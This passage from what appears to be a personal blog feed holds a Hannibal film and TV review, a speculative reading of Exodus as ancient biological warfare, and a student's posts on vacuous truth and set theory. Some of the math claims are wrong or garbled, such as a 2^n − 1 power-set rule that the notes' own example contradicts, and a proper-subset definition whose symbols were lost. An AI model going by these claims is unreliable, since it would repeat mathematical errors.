U$ is a bijection</p><p>$f;f^\leftarrow = I_S = {(x,x) : x ∈ S}$ and $f^\leftarrow;f=I_T={(x,x) : x ∈ T}$</p><p>Fact</p><p>f : S →T is a bijection if and only if there is a g : T → S such that $f;g=I_S$ and $g;f=I_T$</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>汉尼拔</title>
      <link href="/2024/10/01/trivia/Hannibal/"/>
      <url>/2024/10/01/trivia/Hannibal/</url>
      
        <content type="html"><![CDATA[<p>汉尼拔观后感</p><p>今天2024年10月1日，看完汉尼拔电视剧三季。</p><ul><li><a href="#沉默的羔羊">《沉默的羔羊》</a></li><li><a href="#hannibal">《Hannibal》</a></li></ul><h1 id="《沉默的羔羊》"><a href="#《沉默的羔羊》" class="headerlink" title="《沉默的羔羊》"></a>《沉默的羔羊》</h1><p>最早大概是2021年，用着刚买的Ipad看了一些英文世界的经典电影，比如《沉默的羔羊》（The Silence of the Lambs）（电影，1991年首映）。个人简评，电影叙事简洁清晰，故事线清晰利落，适合安静观影体验舒服，很是喜欢这种平静、紧张、干净的影片节奏。</p><p>克丽丝·史达琳（Jodie Foster 饰）作为FBI实习生，一开始调查野牛比尔，请求被囚禁的心理学博士汉尼拔·莱克特（Sir Philip Anthony Hopkins 饰）的帮助，最后独自突击凶手住处，用自己的沉稳、智慧、警觉于黑暗之中击毙了杀人魔。</p><p>没有二刷过这个影片，时隔三年后的我再次仅借脑海中的《沉默的羔羊》的评价，我认为是有价值的，因为经典不会随时间过时。影片中史达琳被上级指派独自调查杀人魔、寻求汉尼拔的帮助，全程没有任何抱怨，安静的执行任务，默默地思考。当她进入精神病监狱时，虽有恐惧，但是见到汉尼拔，露出了自信、干净地微笑去交谈，我相信汉尼拔当时第一眼可能看不上这个小女孩，他只是太寂寞，一开始只是拿史达琳交换身世做分析解闷，但是相别的时候突然发现史达琳的特别，因此告诉了史达琳自己对杀人魔的分析情报。</p><p>《沉默的羔羊》中，可以直接观察到史达琳的沉着冷静：史达琳在SWAT根据上级习惯性忽略自己情报、没有任何外援的情况下，调查到嫌疑犯家中，发现作案现场。杀人魔此时断电，呆着夜视仪仔细端详史达琳的慌乱、紧张的表情，像一跳匍匐的蛇，戏谑的看着猎物慢慢接近；史达琳依靠听觉，敏锐的扣动扳机，击毙了黑暗之中的杀人魔。</p><p>另外的主角，便是汉尼拔，由于杀人魔抓走了议员的女儿，监狱长为谄媚，但是自己智慧不如史达琳那样听得出汉尼拔和史达琳交谈的情报，直接私自用刑拷问汉尼拔。老汉从头到尾都保持着戏谑而文明的微笑，这体现了汉尼拔的自始至终的贵族做派、绝境下依然保持自己的体面与优雅。汉尼拔杀掉警卫，割下了一个警员的脸进行了最原始的伪装成功出逃，这体现了Dr.汉尼拔的凶残嗜血、智慧：思维打破规则、就地取材，看似在监狱中一素带着微笑、老实本分的那个高学历贵族，行动却出人意料的刁钻、血腥、敏捷、有效。中文“静如处子，动如脱兔”，另外有一个很简短的英语单词也更合适“Striking”。</p><p>史达琳和汉尼拔都有着沉默、思考、优雅的品质，观影角度看，两人话不多，却字字珠玑扣人心弦，作为犯罪惊悚片影视的起步，实在令人印象深刻。我初看时，以为只有史达琳是主角，汉尼拔只是一个类似于先知的、情报作用仅推动剧情进行的角色，却没有想到这个男人最后利用残忍和智慧轻松逃离。结局是开放式的，我们不知道史达琳能不能在FBI那样对女性不友好的压抑的氛围中因此站起，也不知道汉尼拔远眺精神病院长的目光中有没有其他的打算。这部电影留下了非常长的遐想空间。</p><h1 id="《Hannibal》"><a href="#《Hannibal》" class="headerlink" title="《Hannibal》"></a>《Hannibal》</h1><p>汉尼拔电视剧（Mads Dittmann Mikkelsen饰）有三部，自我语言班接触博主“汉尼扳”开始看：汉尼拔小曲（Faded异域）配合汉尼拔的行为着实令人看着有趣，矫揉造作的优雅、食者被杀的仁慈、用餐时的惊悚。因此我花了两个月时间，把汉尼拔三季看完了。</p><p>我作为笔者，在看完第一季或者第二季，我想写一些观后感，但是感觉自己没有看到大结局，我的所写是不完整的，虽然看到大结局前，我也产生大量的情绪、感悟、思考，但是直接半路拿出来和人讨论、分析，会影响我后面的观感体验，我不倾向于这么做。观影和写观后感最好的办法，就是关闭弹幕，自己慢慢用心从头看到结局，每一个人物的言行都值得慢慢地分析和思考，而不是出于自己旺盛地分享欲过早地呱噪。</p><p>第一季进展节奏缓慢，我想这应该也是导致汉尼拔收视率低迷地原因。第一季在慢慢的做铺垫，没有商业片一贯的突如其来的倒叙，没有欲抑先扬的博人眼球的套路，没有简单贴人设就开始狂推剧情的粗糙，没有煽情之时就掉眼泪开始真情吐露的美剧套路。汉尼拔第一季，就是在老老实实的铺垫，各种离奇血腥的案件，神出鬼没的连环杀人犯，急心捉拿嫌犯的FBI长官Jack，被Jack拖进犯罪者共情泥潭的Will，以及隐藏在心理学权威、FBI合作者的光环名牌身份下、没有人能从那张脸上读懂内心想法的Dr. Hannibal Lecter。Will是第一季的主角，查案过程中被Hannibal一步步引导、暗示、拖入泥潭，最后一刻才意识到Hannibal是一切的恶魔，但是含冤入狱。</p><p>第一季最impressive的感悟便是，Will身上的特有品质，在各种绝望中，即便认知出现重大障碍，Will始终能坚定保持自我本心。而Hannibal，是个话不多的高学历贵族，沉着冷静，举止优雅友善，以至于剧中很多人无法联想到他是那个真正的恶魔。</p><p>第二季，Will逐步察觉、确定自己在被Hannibal玩弄，但是Will反而凭借自己的高智商、共情能力，发现自己能理解Hannibal，能通过和Hannibal交谈来发挥自己profile杀人犯的潜力。但是Abigal的死却是Will心中的对Hannibal刺，Will喜欢Abigal，但是Hannibal把Abigal杀了，Will迷茫了。他在于Hannibal交流的过程中，也察觉自己由于长期共情各种各样的杀人犯，嗜血的一面被慢慢引导出来了。Hannibal敏锐的闻到了Will身上女记者的香水味道，随后一夜，也接到了那句“They know”，决战来了。Hannibal依然在等Will，等Will要不要坚定地选择和他离开。但是Will依然选择坚持自己的本心，他希望把Hannibal监禁起来，这样大家都不用死，而且他也可以时常去探望Hannibal交流。Hannibal依然很伤心，即便Will看到了Abigal活着的事实，Will依然不后悔自己选择抓Hannibal而非跟他走。天上的雨一直下着，Hannibal用刀割伤了Hannibal和Abigal，冒着雨夜逃离，徒留了满屋子重伤的一行人。</p><p>第二季，Hannibal作为少数的嗜杀本能的杀人魔，作为观众感受得到Hannibal能被理解的潜力：如Will。Hannibal内心渴望能和自己坦诚交流的人，能和自己一起分析其他罪犯进行侧写的朋友，而非像Alana那样看起来在亲密关系但是时时刻刻都在隐瞒和欺骗的人。他鄙视Jack的急功近利而拖Will趟浑水，鄙视Jack的强势却没有深刻的思考能力，他会用很文艺、惊悚的手法去杀掉Jack身边的人来侮辱，打电话折磨Jack。Hannibal有着浓厚的恶趣味，他喜欢调戏Jack这种心理强大但是思考能力空洞的对手，这种对手很稀有，因此他不会直接杀掉Jack、Will这样为数不多能坚挺的人类。Hannibal是孤高的，他没有朋友，因此他渴望通过极端的心理学和医学手段刺激Will能成为他的同类，他也没有办法卸下面具去和Alana交流。一切都要精细计算，一切都在他的掌控，却又那么无聊。他伪装他的知识储量、高智商和嗜杀的本性，从一步以施舍的姿态抛给FBI们浅显的线索为乐。</p><p>很难想象，雨夜中浑身是血的Hannibal，是多么的失望、失落、孤独，他把所有研究资料都烧了，所有建立的社交人物都被他重伤了，他潜伏了数年却一无所有，什么都没有带走。</p><p>第三季，Hannibal逃到了意大利佛罗伦萨。Hannibal自幼便在这里长大，他回到了故乡，他了解Dante，对Divine Comedy有深厚的理解。初始阵营被重新划分为三派：Will、Jack和Mason（Mason Verger）也追到佛罗伦萨复仇。经过角逐，Hannibal想吃掉Will时，他俩都被Mason抓起来送回了美国。Mason因执念，渴望Will的面孔来整容，但是这触怒了Hannibal和Alana，眼下Alana只能寄希望于Hannibal拯救Will。最终，本机的第一个决战，Alana解救了Hannibal，Hannibal解救了Will，Hannibal带Will去了一个隐秘处疗伤。但是Will此时已对Hannibal的信赖和怀疑已感到疲惫，Hannibal无奈正式被捕，锒铛入狱。</p><p>时间过了很久，Will娶了妻子Molly，Molly有一个小孩。Jack此时想追查Francis（Namely also: Tooth fairy, Red dragon）的线索，请求Will出山。Will察觉到Hannibal与Francis存在联络线索和心理治疗。随后，由于红龙的愈发残忍，他几乎仅仅由于奇尔顿医生投机取巧式的捏造畅销书大发横财，就使得奇尔顿医生差点死亡。FBI决定利用Will和Hannibal引诱红龙出现。红龙战力强大，直接劫走Hannibal和Will。最终，红龙因为要每个月杀掉一家人，他想杀掉Will和Hannibal，同时Hannibal直接点明了红龙对幻想的执着、中二，刺激了红龙月光下的嗜血，随后本季第二次决战，hannibal和Will合力刀杀掉了红龙，这使得Will再一次回归第一季开幕射杀Abigal父亲那样，回味了嗜杀的快感。红龙和Will的血液在月光下，飞溅出黑色的漂亮弧线。Will重伤，摸着全身刀痕累累的身体，倒在Hannibal的怀中。两人夜色下紧紧相拥，Will抱着Hannibal一同坠入海中，仿佛在说“我和你走”，好似第二季Will本可以有的和Hannibal一起走的另一个分支情景；却也在说“我答应和你一起走，我却依然无法忘记我的本心，一同坠入深渊，这是你让我和你走的代价”。</p><p>从观影角度看，作为目前暂时的最后一季，我个人感觉，红龙篇略有画蛇添足，引入并深度刻画了一个具有强大战力的精神分裂杀人魔，但是人物刻画过于中二幼稚，实在让人无法体会汉尼拔一系列疯狂杀人魔的文艺惊悚风格，故显突兀。</p><p>红龙篇的作用相对有限：</p><ol><li>呼应汉尼拔三部曲的电影《红龙》</li><li>表现汉尼拔入狱后依然游刃有余的能力</li><li>表现Will即便身负重伤，被Hannibal解救，但是依然保持初心抓捕Hannibal的本性，且能和监狱状态下的Hannibal交流。若没有红龙篇，本机在Hannibal入狱后就剧终，没有机会展现Hannibal和Will在监狱中交流的场景，红龙刚好可以成为Will婚后两者再见的一个引子。这是我认为编剧引入红龙篇的最大原因，想展示Hannibal如何越狱。</li></ol><p>个人认为，其实在Mason那里决战结束更会合适些：比如，Hannibal察觉的Will报警，因此开始孤身逃亡，Will拖着重伤的身体先FBI一步找到Hannibal，会于悬崖边，黑夜，Will和Hannibal紧紧相拥，一同坠入深渊。省略“越狱”场景，何尝不维护了Hannibal的形象和观影体验。</p><p>主角团一只手就数的过来，但是心理刻画和行为却值得人慢慢品味；铺垫是漫长的，但绝非冗长，但却使得于很多人无法慢慢品味。这是充满血腥和诡异的文艺片，却有血液飞溅的美感；月光下，黑色和红色的血液交织，很难不说他不美丽，令人陶醉和上瘾；Hannibal和Will的辗转反侧，隐晦、深沉的捕食者与小白兔，夹杂了道不明的友情与爱情，沉浸体验却无法自拔。</p><p>最后汉尼拔肯定是和Will在杀红龙前，去了女医生家里把她的腿卸下来做了饭，然后做了晚宴，就等杀了红龙然后回去吃腿。从最后的镜头可以看出来，女医生自己没了腿，不可能自己做饭，而且长桌上有丰富的食物和两个人的空的餐具。威尔推了汉尼拔一起坠入悬崖，不清楚是杀了红龙前还是后，去的女医生家里。但是肯定是两个人一起做的饭，概率很大，因为汉尼拔从被劫狱后一直和威尔在一起，两人在去杀红龙之前，有一个很大的空档期。</p>]]></content>
      
      
      <categories>
          
          <category> trivia </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Bible fantasy</title>
      <link href="/2024/09/28/trivia/bible/"/>
      <url>/2024/09/28/trivia/bible/</url>
      
        <content type="html"><![CDATA[<p>2024年9月28日，去了教会社团，学习了Bible中《出埃及记》相关内容，大意是摩西刚出生时因为俊美没有被杀掉，随后漂流到法老女儿居处因为怜悯，而幸运的生存了下来。摩西背负着神的使命，带领以色列人从埃及法老的奴役之下开始出逃。</p><p>我的分析重点在《出埃及记》7:1-13，此处我只对故事做简要概述，如果想结合原文分析，我推荐读者自行搜索“出埃及记第七章”，直接看到耶和华、摩西和法老的情节。</p><ul><li>在法老允许以色列人离开前，法老面对各种不对称的巨大威慑下，均“法老的心刚硬”；</li><li>摩西和法老的博士、术士杖变蛇，但是摩西的蛇直接吞了他们的蛇，推测法老的蛇是真蛇，但是摩西的蛇应该不是当地物种；</li><li>摩西和神连续七天严重污染河流，推测是下毒，破坏当地生态结构；</li><li>大批青蛙生物攻击，随后青蛙死去，腥臭；</li><li>散播虱子，寄生虫，生物攻击；</li><li>苍蝇攻击；</li><li>以色列人的牲畜不死，埃及的牲畜全死；</li><li>摩西在法老面前扬灰起疮，摩西没事儿，其他人有事儿，推测撒的是炭疽菌一类的急性微生物，但是摩西打了疫苗，因此没事儿；</li><li>冰雹攻击，自然环境改变；</li><li>蝗虫入境，生物攻击；</li><li>人和牲畜的长子全部死亡；</li><li>大海分开淹死追兵；</li><li>其中一些神和摩西的方法非常接近 细菌战，生物战，自然气候改变，河流污染，符合科技战争特征。多次出现“法老心刚硬”，有强调法老异于常人的固执，在强烈暗喻真法老被杀，那是个配合神大施神威的机器人。以当时的政治背景，神需要杀鸡儆猴式地施展神威，因此需要法老极度固执，神才有展示震慑威力的机会。</li></ul><p>“神”有可能是大约一千年后的科技水平的以色列后代，穿越时间到过去。这种穿越应该存在什么限制，神无法无时无刻听到这个种族的呼唤，也无法无时无刻出手帮助。圣经据我推测，是以两千年前人的视角记录的神迹，我倾向于故事本身是真实发生过的，值得探寻。</p>]]></content>
      
      
      <categories>
          
          <category> trivia </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vacuous_truth</title>
      <link href="/2024/09/27/Math/vacuous-truth/"/>
      <url>/2024/09/27/Math/vacuous-truth/</url>
      
        <content type="html"><![CDATA[<h1 id="由空集和子集，想到空洞真理"><a href="#由空集和子集，想到空洞真理" class="headerlink" title="由空集和子集，想到空洞真理"></a>由空集和子集，想到空洞真理</h1><p>最开始是因为我上Paul的lecture，他在讲Relation的数学知识，问到“Could one have a releation of itself?”，我在台下想到递归的概念，以及空集的概念，遂答“Recursion! For example, an empty set is a subset of the empty set itself.”当时Paul下台和我聊了一下，可能一下子没有反应过来“空集是不是空集的子集”的概念，遂作罢。</p><p>我当时突然也在问我自己，“空集是空集自己的子集”是true还是false。一开始使用ChatGPT查了一下，我分别用English和Chinese查这个statement是true还是false，但是分别得到了“True”和“False”的回答，我疑惑，发Ed Forum上寻tutors帮助。</p><p>此处我把关键部分以text形式在此处简述或复制：</p><p>“空集是空集的子集”不好判断的原因在于：</p><ol><li>子集的定义是，所有元素也在另一个集合中出现；</li><li>空集没有元素。</li></ol><p>因此，wikipedia上对此statement的描述：</p><p>The empty set, written ∅ or {} has no elements, and therefore is vacuously a subset of any set X.</p><p>注意，这里的副词<strong>vacuously</strong>(空洞地)，有hyperlink指向“<strong>vacuous truth</strong>”（即数学概念“空洞的真理”）。</p><p>我自己的理解与论述（推荐英文不好的同学直接机翻一下，此处“空洞真理”概念很有趣！）：</p><pre><code>Hi tutor Liwenqing Liu,Yeah, what you said is right, it is the only math formula, it can give the number of &#123;&#125;&#39;s subsets, but it cannot prove &#123;&#125; is the subset of &#123;&#125;. It is a B-&gt;A causal relation rather not A-&gt;B relation.I followed Jiapeng Wang&#39;s last reply to understand the vacuous truth, and I sorted out the following steps here.1. &#123;&#125; has no elements2. According to the definition of subsetI cannot prove &#123;&#125; is the subset of &#123;&#125;. Because &#123;&#125; has no element, and &#123;&#125; has no element either. We cannot say that every element of &#123;&#125; belongs to &#123;&#125;.3. there is a paragraph of Vacuous Truth from Wikipedia[Vacuous truth](https://en.wikipedia.org/wiki/Vacuous_truth)It is sometimes said that a statement is vacuously true because it does not really say anything.[2] For example, the statement &quot;all cell phones in the room are turned off&quot; will be true when no cell phones are present in the room. In this case, the statement &quot;all cell phones in the room are turned on&quot; would also be vacuously true, as would the conjunction of the two: &quot;all cell phones in the room are turned on and turned off&quot;, which would otherwise be incoherent and false.I think:&#123;&#125; has the same element of &#123;&#125; ----- Truth3-1. because &#123;&#125; has no element (Empty set&#39;s definition)3-2. neither has no elements =&gt; Both two statements &quot;they have the same elements&quot; and &quot;they have no the same elements&quot; are right. The two statements are both right, but it will be false if combinate them into one statement &quot;they have no the same elements and have the same elements&quot;.So according to Vacuous Truth, it is true that &quot;they have no the same elements&quot; of &#123;&#125; and &#123;&#125;.One more proverb (just for my understanding), if I say &quot;My cat can do backflips at home&quot; to my friend, and then he/she would have a look with me (True). But a normal person knows such a cat who can do backflips doesn&#39;t exist.4. Ok, I don&#39;t how to convince myself of the Vacuous Truth honestly, I am trying to cheat myself. Thank you for seeing this step. I don&#39;t know how to prove &quot;&#123;&#125; is the subset of &#123;&#125;&quot;, it is too hard for me. T_T . I don&#39;t struggle anymore.</code></pre><p>与tutors讨论详情始末详见如图所示。</p><p><img src="/2024/09/27/Math/vacuous-truth/COMP9020-–-Ed-Discussion.png" alt="COMP9020-–-Ed-Discussion"></p><p>其实想想空洞真理：“空洞”表示你无法使用严密逻辑去证明；“真理”表示他是真的，你甚至无法否定（待会儿我再举例子）。在数学领域，空洞真理常可以用于探索模糊的边界问题，来保证数学逻辑的连贯和计算闭包，比如0的概念。</p><p>古代人们数数，都是从1开始作为第一个序数或基数词，没有0的概念。我说我有iphone，只不过数量为0，这句话数学层面是true而非false（注意区分“直觉上认为我没有iphone”和数学性质上“我有iphone”的区别）。人们做加法、减法没有负数的概念，比如B欠A十块钱，A只会说“B，你欠我10快钱，今天先还我3块钱，这样你就只欠我7快钱了。”，而不会想“A应该支付B -10块钱”使用负数来表示。我们现在已经默认了0、正负数计算的概念，甚至已经将其当作了直觉，因此发现直接正负数计算其实很方便算账。如ED Forum的tutors的指正，0的存在，保证了正负数计算的闭包操作。</p><p>空洞真理常常适合纯数学领域确认一些概念的极限、模糊问题，放在物理、生物、化学领域反而大概率不会被承认，大家其实也经常听闻数学家和物理学家在计算方面是存在一些差异和分歧的，数学家大概率习惯在边界问题追求公式的闭包计算，物理学家通常不会这么做。</p><p>其实在日常生活中，我们也经常相信空洞真理，无法证实但是可以是true的statement，举例：</p><ol><li>无法证明历史是否存在，但是你会认为历史人物和故事是真实存在（即true），但是你本身不活在过去的历史，因此你无法证实历史的真实性；</li><li>你和朋友说“我家猫会后空翻”，不论你家真的没猫，你的朋友会相信；</li><li>我有车，只不过目前车的数量是0；</li><li>房间里没手机，但是你可以和领导报告“房间中的全部手机已关机”。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Set theory</title>
      <link href="/2024/09/27/Math/Set-theory/"/>
      <url>/2024/09/27/Math/Set-theory/</url>
      
        <content type="html"><![CDATA[<p>早期数学笔记，大量使用chatGPT辅助，当时不会Tex，直接放图；中英混杂，但是集合基础部分，不再进行整理。</p><ul><li><a href="#basic-knowledge">Basic knowledge</a></li><li><a href="#definition">Definition</a></li><li><a href="#aa-">A⊕A= ∅</a></li><li><a href="#aa">A⊕∅=A</a></li><li><a href="#cantors-paradox">Cantor’s paradox</a></li><li><a href="#russells-paradox-罗素悖论russells-antinomy">Russell’s paradox (罗素悖论)（Russell’s antinomy）</a></li><li><a href="#power-set">power set</a></li><li><a href="#cardinality">Cardinality</a></li><li><a href="#cartesian-product">Cartesian Product</a></li><li><a href="#let-abc-be-sets-is-a-b-cabc">Let A,B,C be sets. Is A ×(B ×C)=(A×B)×C?</a></li><li><a href="#formal-languages-symbols">Formal Languages: symbols</a></li><li><a href="#set-operations-for-languages">Set Operations for languages</a></li><li><a href="#set-equality">Set Equality</a></li><li><a href="#laws-of-set-operations">Laws of Set Operations</a></li><li><a href="#derived-laws">Derived Laws</a></li><li><a href="#two-useful-results">Two Useful Results</a></li></ul><h1 id="Basic-knowledge"><a href="#Basic-knowledge" class="headerlink" title="Basic knowledge"></a>Basic knowledge</h1><p>formal reasoning (logic)：形式推理、逻辑推理 </p><p>A set is a collection of objects (elements). If x is an element of A we write x ∈ A</p><p>Elements are taken from a universe, U,– but this can be quite complex, e.g. numbers, and sets of numbers, and sets of sets of numbers, etc. </p><p>Not all “well-defined” universes are possible, e.g. No “set of all sets” (Cantor’s paradox) No “sets which do not contain themselves” (Russell’s paradox)</p><p>multiplicity：多重性</p><p>A set is defined by the collection of its elements. Order and multiplicity of elements is not considered.</p><p>We distinguish between an element and the set comprising this single element. Thus always a!= {a}.</p><p>Set ∅ = {} is empty (no elements);</p><p><strong>Set  { { } } is nonempty — it has one element</strong></p><h1 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h1><p>For sets S and T, we say S is a subset of T, written S ⊆ T, if every element of S is an element of T</p><p>Take Notice:</p><p>S ⊆T includes the case of S = T S ⊂T —aproper subset: S ⊆ T and S=T ∅ ⊆S for all sets S S ⊆U for all sets S N&gt;0 ⊂N⊂Z⊂Q⊂R An element of a set; and a subset of that set are two different concepts:</p><p>a ∈{a,b}, a ̸⊆ {a,b}; {a} ⊆ {a,b}, {a} /∈ {a,b}</p><p>Take notice of such nested empty sets! they are different entity! interval notation</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-42-16.png" alt></p><p>区间符号：interval notation</p><p>Constructions from other, already defined, sets </p><p>Union (∪), intersection (∩), complement (·c), set difference (), symmetric difference (⊕) </p><p>Power set Pow(X) = { A:A ⊆ X } </p><p>Cartesian product (×)</p><p>A∪B–union (a or b): </p><p>A∪B ={x :x ∈A or x ∈B}. </p><p>A∩B–intersection (a and b): </p><p>A∩B ={x :x ∈A and x ∈B}. </p><p>$A^c$ – complement (with respect to a universal set U): </p><p>$A^c$ ={x : x ∈U and x /∈ A}. </p><p>We say that A,B are disjoint if A ∩B = ∅</p><p>A\B =A∩$B^c$</p><p>symmetric difference (<strong>xor</strong>)</p><p>A⊕B =(A\B)∪(B\A)</p><h1 id="A⊕A-∅"><a href="#A⊕A-∅" class="headerlink" title="A⊕A= ∅"></a>A⊕A= ∅</h1><h1 id="A⊕∅-A"><a href="#A⊕∅-A" class="headerlink" title="A⊕∅=A"></a>A⊕∅=A</h1><h1 id="Cantor’s-paradox"><a href="#Cantor’s-paradox" class="headerlink" title="Cantor’s paradox"></a>Cantor’s paradox</h1><p>Proof: Assume the contrary, and let C be the largest cardinal number. Then (in the von Neumann formulation of cardinality) C is a set and therefore has a power set 2C which, by Cantor’s theorem, has cardinality strictly larger than C. Demonstrating a cardinality (namely that of 2C) larger than C, which was assumed to be the greatest cardinal number, falsifies the definition of C. This contradiction establishes that such a cardinal cannot exist.</p><h1 id="Russell’s-paradox-罗素悖论-（Russell’s-antinomy）"><a href="#Russell’s-paradox-罗素悖论-（Russell’s-antinomy）" class="headerlink" title="Russell’s paradox (罗素悖论)（Russell’s antinomy）"></a>Russell’s paradox (罗素悖论)（Russell’s antinomy）</h1><p>It is a little hard to understand, Russell set wanted to contain any sets that are not belong to itself, but which leaded to the antinomy.</p><p>For better comprehension, we can use the analogies, such as The barber with “shave”(It is a antinomy)</p><p>According to the unrestricted comprehension principle, for any sufficiently well-defined property, there is the set of all and only the objects that have that property. Let R be the set of all sets that are not members of themselves. (This set is sometimes called “the Russell set”.) If R is not a member of itself, then its definition entails that it is a member of itself; yet, if it is a member of itself, then it is not a member of itself, since it is the set of all sets that are not members of themselves. The resulting contradiction is Russell’s paradox. In symbols:</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-46-19.png" alt></p><h1 id="power-set"><a href="#power-set" class="headerlink" title="power set"></a>power set</h1><p>所有子集的集合</p><p>The power set of a set X, Pow(X), is the set of all subsets of X</p><p>Pow({a,b}) = { ∅,{a},{b},{a,b} }</p><h1 id="Cardinality"><a href="#Cardinality" class="headerlink" title="Cardinality"></a>Cardinality</h1><p>The cardinality of a set X (various notation) is the number of elements in that set.</p><p>|X| = #(X) = card(X)</p><p>Always |Pow(X)| = $2^{|X|}$</p><p>（仅适用于非单一∅集合,也适用于{∅}，但是不适用于只有一个∅元素）</p><p>我再重新解释下我自己领悟的这句话，∅比较特殊，他的子集就是自己</p><p>（∅是任何集合子集，但是没有元素），但是没有基数元素，单独考虑</p><p>但是如果论{∅}或{a, ∅}，则这不是空集，这是一个非空集合，有一个空集元素，适用 |pow({∅})|=2^1</p><p>如果有<code>&#123;&#125;</code>(即<code>∅</code>)作为元素，则基数是 |2^n – 1|</p><pre><code>|∅| ? =0Pow(∅) ? = &#123;∅&#125;|Pow(∅)| ? =1Pow(Pow(∅)) ? = pow(&#123;∅&#125;)=&#123;&#123;∅&#125;, ∅&#125;|Pow(Pow(∅))| ? =2|&#123;a&#125;| ? =1Pow(&#123;a&#125;) ? =&#123;∅, a&#125;|Pow(&#123;a&#125;)| ? =2|[m, n]| ? =Pow(&#123;a,b,∅&#125;)=&#123;∅,&#123;a&#125;,&#123;b&#125;,&#123;∅&#125;,&#123;a,b&#125;,&#123;a,∅&#125;,&#123;b,∅&#125;,&#123;a,b,∅\&#125;\&#125;So | Pow(&#123;a,b,∅&#125;)| = 2^3 = 8</code></pre><p>Relatethecardinalities to |A∩B|, |A|, |B|</p><p>|A∪B| = ∣A∣+∣B∣−∣A∩B∣</p><p>|A \ B| = ∣A∖B∣=∣A∣−∣A∩B∣</p><p>|A⊕B| = ∣A∣+∣B∣−2∣A∩B∣</p><h1 id="Cartesian-Product"><a href="#Cartesian-Product" class="headerlink" title="Cartesian Product"></a>Cartesian Product</h1><p>Notice, the <strong>cross product</strong> is <strong>orderd pairs</strong><br>(a,b) is different from (b,a)</p><p>It is similar to points, they are both ordered pairs, (a,b) is different from (b,a)</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-51-19.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-51-34.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-51-41.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-51-58.png" alt></p><h1 id="Let-A-B-C-be-sets-Is-A-×-B-×C-A×B-×C"><a href="#Let-A-B-C-be-sets-Is-A-×-B-×C-A×B-×C" class="headerlink" title="Let A,B,C be sets. Is A ×(B ×C)=(A×B)×C?"></a>Let A,B,C be sets. Is A ×(B ×C)=(A×B)×C?</h1><p>Of course Not.</p><p>A ×(B ×C)=(a, (b, c))</p><p>(A×B)×C=((a, b), c)</p><h1 id="Formal-Languages-symbols"><a href="#Formal-Languages-symbols" class="headerlink" title="Formal Languages: symbols"></a>Formal Languages: symbols</h1><p>Σ —alphabet, a finite, nonempty set</p><p>Examples:</p><p>Σ={a,b,…,z} for single words (in lower case)</p><p>Σ={0,1} for binary integers</p><p>Σ={0,1,…,9} for decimal integers</p><p>A <strong>word</strong> is a finite string (sequence) of symbols from Σ. </p><p>The <strong>empty word</strong>, <strong>λ</strong>, is the unique word with no symbols</p><p>Examples</p><p>w =aba, w =01101…1, etc.</p><p><strong>length(w)</strong> — # of symbols in w </p><p>length(w) = 3,length(λ) = 0 </p><p>The only operation on words (discussed here) is <strong>concatenation</strong>, written as <strong>juxtaposition</strong> </p><p>vw,wv,wvw,vwv,…</p><p>Take Notice </p><pre><code>λw =w =wλ length(vw) = length(v) + length(w)</code></pre><p>Examples </p><pre><code>Let w =abb, v = ab, u = ba vw =ababb ww =abbabb = vubb wλv =abbab length(vw) = length(ababb) = 5</code></pre><p>Formal Languages: Sets of words</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-54-48.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-55-04.png" alt></p><p>For example, the Math language conceived :</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-55-30.png" alt></p><p>HTML language:</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-55-51.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-56-03.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-56-27.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-56-38.png" alt></p><h1 id="Set-Operations-for-languages"><a href="#Set-Operations-for-languages" class="headerlink" title="Set Operations for languages"></a>Set Operations for languages</h1><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-56-58.png" alt></p><p>这是说语言的操作</p><p>$\Sigma^*$ 是所有语言的父集合，因为拥有“all finite words”</p><p>语言是其子集</p><p>X的*次方，是X自己叉乘自己几次</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-57-47.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-57-56.png" alt></p><h1 id="Set-Equality"><a href="#Set-Equality" class="headerlink" title="Set Equality"></a>Set Equality</h1><p>Venn diagrams can help visualize, but are not rigorous.</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-58-35.png" alt></p><p>(0, 4) = {1,2,3} = {3,2,1}</p><h1 id="Laws-of-Set-Operations"><a href="#Laws-of-Set-Operations" class="headerlink" title="Laws of Set Operations"></a>Laws of Set Operations</h1><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-58-57.png" alt></p><h1 id="Derived-Laws"><a href="#Derived-Laws" class="headerlink" title="Derived Laws"></a>Derived Laws</h1><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-59-24.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-59-30.png" alt></p><h1 id="Two-Useful-Results"><a href="#Two-Useful-Results" class="headerlink" title="Two Useful Results"></a>Two Useful Results</h1><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-15-00-19.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-15-00-33.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-15-00-49.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-15-01-00.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-15-01-14.png" alt></p><p><img 